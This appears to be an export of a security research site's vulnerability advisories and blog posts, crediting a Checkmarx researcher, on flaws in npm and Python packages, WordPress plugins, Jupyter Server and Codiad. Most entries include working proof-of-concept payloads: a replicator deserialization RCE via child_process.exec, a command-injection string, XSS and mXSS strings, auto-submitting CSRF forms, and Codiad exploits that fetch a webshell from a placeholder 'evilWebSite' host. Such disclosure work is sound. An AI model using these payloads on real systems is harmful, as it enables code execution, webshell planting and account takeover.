(SimpleFunctionRegistry.FunctionInvocationWrapper)catalog.lookup(functionName);\n\t\t\t\tif (function != null)\n\t\t\t\t{\n\t\t\t\t\tregisteredBeans.add(functionName);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch (Exception e)\n\t\t\t{\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"Num of registered functions: \" + registeredBeans.size());\n\t\tSystem.out.println(registeredBeans);\n}\n\n```\n2. The output will list all of the functions a user can call, there will be more than the application's intention.\n\n### Expected result:\nUnintended functions could be executed, the impact could vary.\n\n## Remediation\nUpdate Spring Cloud Function to 3.2.6 or above, and use the configuration spring.cloud.function.ineligible-definitions to exclude unintended functions.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Commit](https://github.com/spring-cloud/spring-cloud-function/commit/1381cd4e6d04961d028683d2226242c01d7397ab)","tags":["java","function"]},{"title":"CVE-2021-33420: NPM Replicator Remote Code Execution Deserialization","url":"/2021/06/13/NPM Replicator Remote Code Execution Deserialization/","content":"# Introduction\nNPM, the package manager for Node.js, is an open source project that serves as a critical part of the JavaScript community and helps support one of the largest developer ecosystems. According to its [website](https://www.npmjs.com/), \"npm is relied upon by more than 11 million developers worldwide. The free npm registry has become the center of JavaScript code sharing, and with more than one million packages, is the largest software registry in the world.\"\n\nGiven the breadth of the npm universe and the Checkmarx Security Research Team’s always-on curiosity into performing investigations into open source projects and uncovering 0-days, we recently conducted an npm-focused vulnerability workshop. As a result of our efforts, we discovered an interesting remote code execution (RCE) deserialization issue in the npm [Replicator](https://www.npmjs.com/package/replicator) package.\n# Impact Summary\nDeserialization of any untrusted input in the npm Replicator package, which sees more than 200,000 downloads per week, could lead to remote code execution and full compromise of the machine.\n\n# Overview\nReplicator is an \"advanced JavaScript objects serialization\" package in npm. This package wraps around the JSON parse and stringify functions, and provides additional functionalities to it. On top of the JSON key-value pairs, Replicator adds support for the following 9 objects:\n\n* undefined\n* NaN\n* Date\n* RegExp\n* Error\n* Map\n* Set\n* ArrayBuffer\n* Typed arrays\n\n# Details\nFirst, let's get a general idea of how Replicator serializes and deserializes those unsupported JSON objects. When trying to serialize a ***Set*** object for example, the following output will be generated:\n\n<img src=\"/img/blogs/replicator/Image-1.png\" style=\"width: 100%;\"/>\n\nThe object ***Set*** was changed to a valid JSON with the key \"@t\" pointing to the type of the object inside the double brackets \"[[***type***]]\", and the parameters passed to the object are under the \"data\" property.\n\nWhen researching these types of packages, it’s interesting to focus on the deserialization component since it is more likely that a user input would be string passed to the deserialization code rather than an object passing to the serialization code.\n\nAfter checking how the deserialization is implemented in the code, the first 8 types seemed safe. However, with further examination, we came across an issue at the last object type – ***TypeArray***.\n\n<img src=\"/img/blogs/replicator/Image-2.png\" style=\"width: 100%;\"/>\n\nThe function on the bottom is the one responsible for the deserialization. With that, let’s serialize one of the TypeArrays – ***Int8Array***:\n\n<img src=\"/img/blogs/replicator/Image-3.png\" style=\"width: 100%;\"/>\n\nThe property \"ctorName\" states the object name of the ***TypeArray*** and the \"arr\" is the object value. But the issue in the code is that there is no validation that the object name in \"ctorName\" is actually a ***TypeArray*** object. When serializing, on the other hand, there is a validation using the list \"TYPED_ARRAY_CTORS\" defined earlier.\n\n<img src=\"/img/blogs/replicator/Image-4.png\" style=\"height: 30%;width: 30%;\"/>\n\nLooking at the code shown before we can invoke \"new\" on every function under the GLOBAL object with our own parameters. Something like this:\n\n<img src=\"/img/blogs/replicator/Image-5.png\" style=\"width: 50%;\"/>\n\nFrom here, there are limitations that we need to bypass in order to achieve the code execution.\n\n1. From the \"fromSerializable\" function check, the \"ctorName\" must be a name of a function.\n2. The function must be a constructor.\n    * Hence, we can’t just call \"Eval\" because it’s not a constructor.\n\n<img src=\"/img/blogs/replicator/Image-6.png\" style=\"width: 70%;\"/>\n\n3. Must be a direct descendent of the GLOBAL object.\n    * It’s impossible to call a function like \"child_process.exec(‘evilcode’)\" because we control only the value inside the brackets\n\n<img src=\"/img/blogs/replicator/image-7.jpg\" style=\"width: 100%;\"/>\n\n4. Must be a valid JSON.\n    * As mentioned before, Replicator wraps around JSON parse and stringify. Due to that, the input string given to the decode function gets \"JSON.parse\" before going into the problematic \"fromSerializable\" function. So, calling \"setImmediate\" / \"setInterval\" / \"setTimeout\" isn’t possible because it requires a callback function as an input and that isn’t JSON valid.\n\n<img src=\"/img/blogs/replicator/Image-9.png\" style=\"width: 100%;\"/>\n\nThe following payload will fail at JSON.parse before invoking a new setTimeout:\n\n<img src=\"/img/blogs/replicator/Image-10.png\" style=\"width: 100%;\"/>\n\nThere is a way to pass a string (which is a JSON valid input) that will be converted to JavaScript code. Using a new \"Function\" will create an anonymous function with our payload, but it will not get executed.\n\n<img src=\"/img/blogs/replicator/Image-11.png\" style=\"width: 70%;\"/>\n\nAt this point, it looks like we cannot go further, but there are still some security concerns and vulnerabilities despite the limitations:\n\n* Calling an arbitrary function created by the application using replicator, which heavily depends on the application and the specific situation, something like:\n\n<img src=\"/img/blogs/replicator/Image-12.png\" style=\"width: 50%;\"/>\n\n* Local file inclusion using \"require\" could lead to other vulnerabilities, such as: XSS, RCE, sensitive information disclosure, and more. This, as well, depends on the attack scenario.\n\n<img src=\"/img/blogs/replicator/Image-13.png\" style=\"width: 50%;\"/>\n\n* Etc...\n\nAfter fuzzing and some more research, we asked ourselves what happens if we serialize a ***Set*** within a ***Set***. What would that look like? Is it done recursively?\n\n<img src=\"/img/blogs/replicator/Image-14.png\" style=\"width: 100%;\"/>\n\nWhen understanding that the serialization/deserialization is done recursively, the payload to an RCE was around the corner. As mentioned before, we can create a new \"Function\", but nothing will run it, and we can call \"setTimeout,\" but have to give it a function to execute.\n\nCombining these two, here is the final payload to trigger code execution:\n\n```js\nreplicator.decode('[{\"@t\":\"[[TypedArray]]\",\"data\":{\"ctorName\":\"setTimeout\",\"arr\":​{\"@t\":\"[[TypedArray]]\",\"data\":{\"ctorName\":\"Function\",\"arr\":\" process.mainModule.require(\\'child_process\\').exec(\\'calc\\');\"}}​}}]')\n```\n\n<img src=\"/img/blogs/replicator/Image-15.png\" style=\"width: 100%;\"/>\n\nThe inner object will create a function with the code input as a string, and the other object, \"setTimeout\", receives the function as an argument and runs the code.\n\nDepends on the scope of the program, the shell exploit code could change. For example, in the picture above, the payload was: `require(\\'child_process\\').exec(\\'calc\\')` without `process.mainModule` because it was run in a REPL console.\n\n# Recommendations\nTo avoid issues like this, update the npm Replicator package to version 1.0.4 or later.\n\n# Summary of Disclosure and Events\nAfter discovering and validating the vulnerabilities, we notified npm of our findings and worked with them throughout the remediation process until they informed us the issues were appropriately patched. NPM's responsiveness and professionalism throughout the process are commendable.\n\n# Timeline of Disclosure\n| Date    | Action |\n| -------- | ------- |\n| March 24, 2021 | Vulnerability was reported responsibly |\n| March 24, 2021 | Checkmarx SCA customers using npm and Replicator were warned and provided mitigation guidance, * without exposing the technical details of the findings |\n| May 14, 2021 | Pull request to fix the issue was created |\n| May 17, 2021 | Fixed version 1.0.4 was released on NPM |\n| May 17, 2021 | Advisory with the full details was published on the Checkmarx advisory website |\n| December 15, 2022 | CVE-2021-33420 published |\n\n# Final Words\nDiscovering vulnerabilities like the ones documented in this report is why the Checkmarx Security Research Team performs investigations into open source projects. With open source making up the vast majority of today’s commercial software, security vulnerabilities must be taken seriously and handled carefully across the industry.\n\nSolutions like [Checkmarx SCA](https://checkmarx.com/product/cxsca-open-source-scanning/?) are essential in helping organizations identify, prioritize, and remediate open source vulnerabilities more efficiently to improve their overall software security risk posture. Checkmarx SCA customers receive notice of issues like the ones described above in advance of public disclosure. For more information or to speak to an expert about how to detect, prioritize, and remediate open source risks in your code, contact us.\n\n# References\n* [Issue](https://github.com/inikulin/replicator/issues/16)\n* [Pull request](https://github.com/inikulin/replicator/pull/17)\n* [Fixing Commit](https://github.com/inikulin/replicator/commit/2c626242fb4a118855262c64b5731b2ce98e521b)\n* [Advisory](https://advisory.checkmarx.net/advisory/CX-2021-4787)","tags":["deserialization","rce","npm"]},{"title":"Deserialization RCE attack in replicator","url":"/2021/05/16/Deserialization RCE attack in replicator/","content":"## Summary\nAffected versions of replicator npm package are vulnerable to a deserialization RCE via the TypedArrays objects. replicator doesn't verify the object type given when deserializing TypedArrays and thus letting an attacker create arbitrary objects.\n\n## Product\nreplicator before 1.0.4.\n\n## Impact\nIn case an untrusted data get deserialized, an attacker could achieve RCE.\n\n## Steps to reproduce\n```\nreplicator.decode('[{\"@t\":\"[[TypedArray]]\",\"data\":{\"ctorName\":\"setTimeout\",\"arr\":​{\"@t\":\"[[TypedArray]]\",\"data\":{\"ctorName\":\"Function\",\"arr\":\"process.mainModule.require(\\'child_process\\').exec(\\'calc\\');\"}}​}}]')\n```\n\n### Expected result:\nThe command in the exec function will be run, in this case aimed for a Windows machine a calculator will pop up.\n\n## Remediation\nUpdate replicator dependency to 1.0.4 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Pull request](https://github.com/inikulin/replicator/pull/17)\n2. [Issue](https://github.com/inikulin/replicator/issues/16)\n3. [Commit](https://github.com/inikulin/replicator/commit/2c626242fb4a118855262c64b5731b2ce98e521b)\n4. [Blog](https://checkmarx.com/blog/npm-replicator-remote-code-execution-deserialization)\n","tags":["deserialization","rce","npm"]},{"title":"Command injection vulnerability in curl-ganteng","url":"/2021/04/25/Command injection vulnerability in curl-ganteng/","content":"## Summary\nAffected versions of `curl-ganteng` npm package are vulnerable to command injection vulnerability in the `curl` function.\n\n## Product\nAll versions of curl-ganteng npm package.\n\n## Impact\nThis issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.\n\n## Steps to reproduce\nRun the following PoC:\n\n```js\nvar curl = require('curl-ganteng')\ncurl.curl(\"google.com' `mkdir pwnd`'\").catch((a) => {console.log(a)}).then((a) => {console.log(a)})\n```\n\n### Expected result:\nA new folder named ‘pwnd’ will be created.\n\n## Remediation\nCurrently there is no fix version released. As a workaround, avoid passing untrusted input into the vulnerable parameters when using the library.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. [curl-gateng npm package](https://www.npmjs.com/package/curl-ganteng)\n","tags":["rce","node","nodejs","javascript","npm"]},{"title":"Remote code execution vulnerability in reqwest","url":"/2021/04/25/Remote code execution vulnerability in reqwest/","content":"## Summary\nAffected versions of `reqwest` npm package are vulnerable to remote code execution vulnerability when requesting a malicious URL.\n\n## Product\nAll versions of reqwest npm package.\n\n## Impact\nThis issue may lead to remote code execution if the URL fetched is untrusted input.\n\n## Steps to reproduce\n1. Run the following server:\n\n```py\nfrom flask import Flask, Response\napp = Flask(__name__)\n \n \n@app.route('/')\ndef hello():\n    resp = Response(\"Foo bar baz\")\n    resp.data = 'require(\"child_process\").exec(\"calc\")'\n    resp.headers[\"Content-Type\"] = \"javascript\"\n    return resp\n    \n \nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5555, debug=True)\n```\n\n2. Make a get request to the server:\n\n```js\nvar reqwest = require('reqwest')\nreqwest({\n    url: 'http://localhost:5555/'\n  , method: 'get'\n  , success: function (resp) {\n      qwery('#content').html(resp)\n    }\n})\n```\n\n### Expected result:\nA calculator will pop up on the server.\n\n## Remediation\nCurrently there is no fix version released.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. [reqwest npm repository](https://www.npmjs.com/package/reqwest)\n","tags":["rce","node","nodejs","javascript","npm"]},{"title":"Hostname spoofing in url-parse","url":"/2021/02/17/Hostname spoofing in url-parse/","content":"## Summary\nAffected versions of url-parse mishandles certain uses of backslash such as `http:\\/` and interprets the URI as a relative path.\nBrowsers accept backslashes after the protocol, and treat it as a normal slash, while url-parse sees it as a relative path. \nThe vulnerability fix was pushed to 1.5.0 but caused other problems, version 1.5.1 is the recommended update.\n\n## Product\nurl-parse before 1.5.0.\n\n## Impact\nDepending on library usage and attacker intent, impacts may include allow/block list bypasses, SSRF attacks, open redirects, or other undesired behavior.\n\n## Steps to reproduce\n```\nvar Url = require('url-parse');\nnew Url('https:\\\\/github.com/foo/bar');\n```\n\n### Expected result:\nthe url would be relative without a hostname:\n```\n{\n  slashes: false,\n  protocol: 'https:',\n  hash: '',\n  query: '',\n  pathname: '//github.com/foo/bar',\n  auth: '',\n  host: '',\n  port: '',\n  hostname: '',\n  password: '',\n  username: '',\n  origin: 'null',\n  href: 'https://github.com/foo/bar'\n}\n```\n\n## Remediation\nUpdate url-parse dependency to 1.5.1 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. Commit [d1e7e88](https://github.com/unshiftio/url-parse/commit/d1e7e8822f26e8a49794b757123b51386325b2b0)\n2. [Pull request](https://github.com/unshiftio/url-parse/pull/197)\n3. [Security notes](https://github.com/unshiftio/url-parse/blob/master/SECURITY.md#history)\n","tags":["javascript","npm","improper validation","spoofing"]},{"title":"Hostname spoofing in urijs","url":"/2021/02/12/Hostname spoofing in urijs/","content":"## Summary\nAffected versions of urijs fails to validate the hostname correctly when using backslash in the protocol e.g. `http:\\/`.\nBrowsers accept backslashes after the protocol, and treat it as a normal slash, while urijs sees it as a relative path.\n\n## Product\nurijs before 1.19.6.\n\n## Impact\nDepending on library usage and attacker intent, impacts may include allow/block list bypasses, SSRF attacks, open redirects, or other undesired behavior.\n\n## Steps to reproduce\n```\nvar URI = require('urijs');\nURI('http:/\\www.google.com');\n```\n\n### Expected result:\nthe url would be relative without a hostname:\n```\nURI { \n  _string: '', \n  _parts: { \n    protocol: 'http', \n    username: null, \n    password: null, \n    hostname: null, \n    urn: true, \n    port: null, \n    path: '/www.google.com', \n    query: null, \n    fragment: null, \n    preventInvalidHostname: false, \n    duplicateQueryParameters: false, \n    escapeQuerySpace: true \n  }, \n  _deferred_build: true \n} \n```\n\n## Remediation\nUpdate urijs dependency to 1.19.6 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. Commit [a1ad8bc](https://github.com/medialize/URI.js/commit/a1ad8bcbc39a4d136d7e252e76e957f3ece70839)\n2. [Release note](https://github.com/medialize/URI.js/releases/tag/v1.19.6)\n3. [Advisory](https://github.com/medialize/URI.js/security/advisories/GHSA-p6j9-7xhc-rhwp)\n","tags":["javascript","npm","improper validation","spoofing"]},{"title":"Denial of Service in get-ip-range package","url":"/2021/02/09/Denial of Service in get-ip-range package/","content":"## Summary\nAffected versions of get-ip-range are vulnerable to denial of service in case the ip-range is an untrusted input. An attacker could send a large range of IPs e.g. '192.168.1.1/0' and result in a JavaScript heap out of memory crash.\n\n## Product\nget-ip-range before 4.0.0.\n\n## Impact\nCrashing a program that passes user input to get-ip-range.\n\n## Steps to reproduce\n```\nimport { getIPRange } from 'get-ip-range';\ngetIPRange('192.168.1.1/0');\n```\n\n### Expected result:\n```JavaScript heap out of memory``` crash.\n\n## Remediation\nUpdate get-ip-range dependency to 4.0.0 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. Commit [98ca22b](https://github.com/JoeScho/get-ip-range/commit/98ca22b815c77273cbab259811ab0976118e13b6)\n","tags":["javascript","dos","denial of service"]},{"title":"Mutation XSS in Mozilla-bleach using comments","url":"/2021/01/31/Mutation XSS in Mozilla-bleach using comments/","content":"## Summary\nAffected versions of Mozilla-bleach are vulnerable to Mutation XSS (mXSS) vulnerability when calling bleach.clean with:\n* `svg` or `math` allowed \n* `p` or `br` allowed\n* one of the RCDATA tags allowed:\n```\nscript\nnoscript\nstyle\nnoframes\nxmp\nnoembed\niframe\n```\n* and the argument `strip_comments=False`\n\n\n## Product\nBleach before 3.3.0.\n\n## Impact\nAccording to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.\n\n## Steps to reproduce\n```\n>>> import bleach\n>>> bleach.clean('<math></p><style><!--</style><img src/onerror=alert(1)>', tags=['math', 'p', 'style'], strip_comments=False)\n```\n\n### Expected result:\n```<math><p></p><style><!--</style><img src/onerror=alert(1)>--></style></math>```\n\n## Remediation\nUpdate bleach dependency to 3.3.0 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. [Advisory](https://github.com/advisories/GHSA-vv2x-vrpj-qqpq)\n2. Commit [79b7a3c](https://github.com/mozilla/bleach/commit/79b7a3c5e56a09d1d323a5006afa59b56162eb13)\n","tags":["python","mozilla","xss","mxss"]},{"title":"CSRF in Elementor-Contact-Form-DB wordpress plugin","url":"/2021/01/13/CSRF in Elementor-Contact-Form-DB wordpress plugin/","content":"## Summary\nAffected versions of the \"Elementor Contact Form DB\" plugin for WordPress are vulnerable to a Cross-Site Request Forgery (CSRF) attack.\n\n## Product\nElementor Contact Form DB Wordpress plugin before 1.6\n\n## Impact\nAn admins that visits a malicious site could change The Elementor-Contact-Form-DB setting without his/her knowledge.\n\n## Steps to reproduce\n1. Wordpress with vulnerable Elementor Contact Form DB plugin installed\n2. Admin visits the page: \n```\n<html><head></head>\n<body>\n<form style=\"opacity: 0;\" action=\"http://[site-url]/wp-admin/edit.php?post_type=elementor_cf_db&page=sb_elem_cfd_settings\" method=\"POST\">\n        <input type=\"number\" name=\"sb_elem_cfd[disable_admin_nag]\" value=\"1\" />\n        <input type=\"text\" name=\"sb_elem_cfd[records_min_role]\" value=\"lfb_role\" />\n        <input type=\"text\" name=\"sb_elem_cfd_save\" value=\"Save Settings\" />\n<button>submit</button>\n</form>\n\n```\n\n\n### Expected result:\nAdmin setting page will change according to the attacker's input.\n\n## Remediation\nUpdate Elementor-Contact-Form-DB to 1.6 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Changeset](https://plugins.trac.wordpress.org/changeset/2454670)\n","tags":["wordpress","csrf"]},{"title":"RCE via site-offline wordpress plugin","url":"/2020/12/22/RCE via site-offline wordpress plugin/","content":"## Summary\nThe site-offline WordPress plugin before version 1.4.4 was vulnerable to Cross-site Request Forgery (CSRF) and Cross-Site Scripting (XSS) attacks.\n\n## Product\nSite-offline wordpress plugin before version 1.4.4\n\n## Impact\nSubject to WordPress and server configurations, successful exploitation of the Cross-Site Scripting vulnerability may lead to remote code execution.\n\n## Steps to reproduce\n1. Setup a WordPress website with the Site Offline plugin installed and activated.\n2. Admin visits the page \n```\n<html><head></head>\n<body>\n<form style=\"opacity: 0;\" action=\"http://local-wp/wp-admin/admin.php?page=sahu_site_offline_wp\" method=\"POST\">\n<input type=\"text\" name=\"action_dashboard\" value=\"sahu_sop_dashboard\"/>\n<input type=\"number\" name=\"sahu_so_status\" value='1' />\n<input type=\"text\" name=\"so_headline\" value=\"\" onfocus='alert(1)'\" />\n<input type=\"text\" name=\"so_description\" value=\"<img src=x onerror=alert(1)>\" />\n<input type=\"number\" name=\"display_logo\" value='0' />\n<input type=\"text\" name=\"so_logo_ur\" value=\"\">\n<button>submit</button>\n</form>\n<script>document.querySelector('form').submit();</script>\n</body></html>\n```\n\n### Expected result:\nAn alert should be shown on the target WordPress admin panel.\n\n## Remediation\nUpdate Site-offline plugin to 1.4.4 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Changeset](https://plugins.trac.wordpress.org/changeset/2445009/)\n2. [Site Offline WordPress Plugin](https://wordpress.org/plugins/site-offline/)\n","tags":["wordpress","csrf","rce","webshell","xss"]},{"title":"Open redirect in Jupyter server","url":"/2020/12/16/Open redirect in Jupyter server/","content":"## Summary\nThe Jupyter Server provides the backend (i.e. the core services, APIs, and REST endpoints) for Jupyter web applications like Jupyter notebook, JupyterLab, and Voila. Affected versions of Jupyter Server are vulnerable to open redirect vulnerability. All jupyter servers running without a base_url prefix are technically affected, however, these maliciously crafted links can only be reasonably made for known jupyter server hosts.\n\n## Product\nJupyter Server before version 1.1.1\n\n## Impact\nA link to a jupyter server may appear safe, but ultimately redirect to a malicious site.\n\n## Steps to reproduce\n1. Run a jupyter server on port 1111\n2. Navigate to ```http://localhost:1111/login?next=//example.com```\n\n### Expected result:\n`https://example.com` will load.\n\n## Remediation\nUse on of the two options:\n1. Update jupyter_server package to 1.1.1 or above.\n2. Run your server on a url prefix: \"jupyter server --ServerApp.base_url=/jupyter/\".\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Advisory](https://github.com/advisories/GHSA-9f66-54xg-pc2c)\n2. Commit [85e4abc](https://github.com/jupyter-server/jupyter_server/commit/85e4abccf6ea9321d29153f73b0bd72ccb3a6bca)\n","tags":["python","open redirect"]},{"title":"CSRF in ultimate-category-excluder wordpress plugin","url":"/2020/12/07/CSRF in ultimate-category-excluder wordpress plugin/","content":"## Summary\nAffected versions of the ultimate-category-excluder WordPress plugin are vulnerable to a Cross-Site Request Forgery (CSRF) attack in the page `ultimate-category-excluder.php`.\n\n## Product\nultimate-category-excluder wordpress plugin before 1.2\n\n## Impact\nAn admins that visits a malicious site could change The ultimate-category-excluder setting without his/her knowledge.\n\n## Steps to reproduce\n1. Wordpress with vulnerable ultimate-category-excluder plugin installed\n2. Admin visits the page:\n```\n<html><head></head>\n<body>\n<form style=\"opacity: 0;\" action=\"http://[wordpress_url]/wp-admin/options-general.php?page=ultimate-category-excluder.php\" method=\"POST\">\n<input type=\"text\" name=\"exclude_main[]\" value=\"-1\" />\n<input type=\"text\" name=\"exclude_feed[]\" value=\"-1\" />\n<input type=\"text\" name=\"exclude_search[]\" value=\"-1\" />\n<input type=\"number\" name=\"exclude_archives[]\" value='-1' />\n<input type=\"text\" name=\"ksuce\" value=\"true\" />\n<button>submit</button>\n</form>\n\n<script>document.querySelector('form').submit();</script>\n</body></html>\n```\n\n\n### Expected result:\nAdmin setting page will change according to the attacker's input.\n\n## Remediation\nUpdate ultimate-category-excluder to 1.2 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Changeset](https://plugins.trac.wordpress.org/changeset/2434070)\n","tags":["wordpress","csrf"]},{"title":"Mutation Cross-Site Scripting in lxml","url":"/2020/11/26/Mutation Cross-Site Scripting in lxml/","content":"## Summary\nThe lxml python package is vulnerable to mXSS due to the use of improper parser. The parser used doesn't imitate browsers, which causes different behaviors between the sanitizer and the user's page. This can result in an arbitrary HTML/JS code execution.\n\n## Product\nlxml from 1.2 up to 4.6.1\n\n## Impact\nUsing lxml as a sanitizer might not fulfill its purpose. \n\n## Steps to reproduce\n```\n>>> from lxml.html.clean import clean_html\n>>> clean_html('<svg><style><img src=x onerror=alert(1)></style></svg>')\n>>> clean_html('<noscript><style><a title=\"</noscript><img src=x onerror=alert(1)>\">')\n```\n\n### Expected result:\n```<svg><style><img src=x onerror=alert(1)></style></svg>```\nAnd\n```<noscript><style><a title=\"</noscript><img src=x onerror=alert(1)>\"></style></noscript>```\n\n## Remediation\nUpdate lxml dependency to 4.6.2 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Advisory](https://github.com/advisories/GHSA-pgww-xf46-h92r)\n2. Initial commit [89e7aad](https://github.com/lxml/lxml/commit/89e7aad6e7ff9ecd88678ff25f885988b1)\n3. Additional commit [a105ab8](https://github.com/lxml/lxml/commit/a105ab8dc262ec6735977c25c13f0bdfcdec72a7)\n","tags":["python","xss","mxss"]},{"title":"Reintroduced ReDoS in debug","url":"/2020/11/17/Reintroduced ReDoS in debug/","content":"## Summary\nThe debug module is vulnerable to regular expression denial of service when untrusted user input is passed into the `o` formatter. It takes around 50k characters to block for 2 seconds making this a low severity issue. This vulnerability is a reintroduction of CVE-2017-16137 in version 3.2.0.\n\n## Product\ndebug before 4.3.1.\n\n## Impact\nThe impact of this vulnerability is considered low due to the low severity of the issue.\n\n## Remediation\nUpdate the debug dependency to 4.3.1 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. Commit [b6d12fd](https://github.com/visionmedia/debug/commit/b6d12fdbc63b483e5c969da33ea6adc09946b5ac)\n2. [Issue](https://github.com/visionmedia/debug/issues/797)\n","tags":["javascript","npm","redos"]},{"title":"Codiad CSRF in the plugin request","url":"/2020/08/19/Codiad CSRF in the plugin request/","content":"## Summary\nA Cross Side Request Forgery (CSRF) vulnerability was found in Codiad. The request to download a plugin from the marketplace is only available to admin users and it isn’t CSRF protected. This might cause admins to make a vulnerable request without them knowing and result in an RCE.\n\n## Product\nCodiad from v1.7.8.\n\n## Impact\nAn malicious link sent to the an admin can result in a webshell on the server.\n\n## Steps to reproduce\n```\n<html><head></head>\n<body>\n<form style=\"opacity: 0;\" action=\"http://[Codiad-url]/components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=\" method=\"GET\">\n<button>submit</button>\n</form>\n<script>document.querySelector('form').submit();</script>\n</body></html>\n```\n\n### Expected result:\nA webshell from ```http://evilWebSite/webshell/webshell.zip``` will be downloaded to the server.\n\n## Remediation\nThere is no fixed version of Codiad.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Issue](https://github.com/Codiad/Codiad/issues/1122)\n","tags":["csrf","php","rce","webshell"]},{"title":"Codiad SSRF when installing a plugin","url":"/2020/08/19/Codiad SSRF when installing a plugin/","content":"## Summary\nA Server-Side Request Forgery (SSRF) vulnerability was found in Codiad. A user with admin privileges could use the plugin install feature to make the server request any URL. This could potentially result in an RCE. Combined with other vulnerabilities, an unauthenticated attacker can manipulate the admin to exploit this vulnerability without their knowledge.\n\n## Product\nCodiad from v1.7.8.\n\n## Impact\nMalicious files could be downloaded to the server.\n\n## Steps to reproduce\n1. Login to codiad then visit the page:\n```\n<html><head></head>\n<body>\n<form style=\"opacity: 0;\" action=\"http://[codiad_url]/components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=\" method=\"GET\">\n<button>submit</button>\n</form>\n\n<script>document.querySelector('form').submit();</script>\n</body></html>\n```\n\n### Expected result:\nA webshell from ```http://evilWebSite/webshell/webshell.zip``` will be downloaded to the server.\n\n## Remediation\nThere is no fixed version of Codiad.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Issue](https://github.com/Codiad/Codiad/issues/1122)\n","tags":["php","rce","webshell","ssrf"]},{"title":"Stored XSS via folder name in Codiad","url":"/2020/08/19/Stored XSS via folder name in Codiad/","content":"## Summary\nA Cross Site Scripting (XSS) vulnerability was found in Codiad. The vulnerability occurs due to improper sanitization of the folder’s name, the `$path` variable in `components/filemanager/class.filemanager.php`.\n\n## Product\nCodiad from v1.7.8.\n\n## Impact\nAn attacker could run arbitrary Javascript code on the users, chaining this vulnerability with another one, an RCE vulnerability could be achieved.\n\n## Steps to reproduce\n1. Login to codiad\n2. Create a folder and name it with html element\n3. The following example running on an admin will result in a webshell:```<img width=1 height=1 src=components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=>```\n\n### Expected result:\nThe html element is running when viewing the folder name.\n\n## Remediation\nThere is no fixed version of Codiad.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Issue](https://github.com/Codiad/Codiad/issues/1122)\n","tags":["php","rce","webshell","xss"]},{"title":"Mutation Cross-Site Scripting (mXSS) Vulnerabilities Discovered in Mozilla-Bleach","url":"/2020/07/07/Mutation Cross-Site Scripting (mXSS) Vulnerabilities Discovered in Mozilla-Bleach/","content":"# Introduction\nAs part of the beta testing phase that took place earlier this year for our recently launched Software Composition Analysis solution, [CxSCA](https://www.checkmarx.com/product/cxsca-open-source-scanning/?), the Checkmarx Security Research Team investigated Mozilla-Bleach, finding multiple concerning security vulnerabilities. Patches were released in mid-March 2020, with Checkmarx CxSCA customers using Bleach receiving notice of the issues in advance. Given that the patches have been in-market for some time, giving Bleach users sufficient time to update their software versions, we’re now publishing the full technical report and [proof-of-concept](https://youtu.be/cJZg3qj7sz0) video for educational purposes.\n\n# Overview\nAccording to documentation, “Bleach is an allowed-list-based HTML sanitizing library that escapes or strips markup and attributes and is intended for sanitizing text from untrusted sources.” In simpler terms, Bleach is a very user-friendly HTML sanitizer, and its main purpose is to disallow arbitrary tags to run (e.g., JavaScript (JS) tags and attributes to prevent cross-site scripting (XSS)). After a bit of fuzzing and using some different approaches, Checkmarx researchers discovered the possibility that a mutation XSS (mXSS) vulnerability may exist. With further digging, these suspicions were confirmed, and several mXSS vulnerabilities were discovered in the Mozilla-Bleach python package. An attacker abusing these vulnerabilities would have the ability to execute an arbitrary JavaScript code on the user end, via various sites or projects that use Bleach.\n\n\n# Mutation XSS (mXSS)\nA mXSS vulnerability occurs when there is incoherent parsing between the client and the sanitizer. To understand this better, the following example should help. Let’s see how a 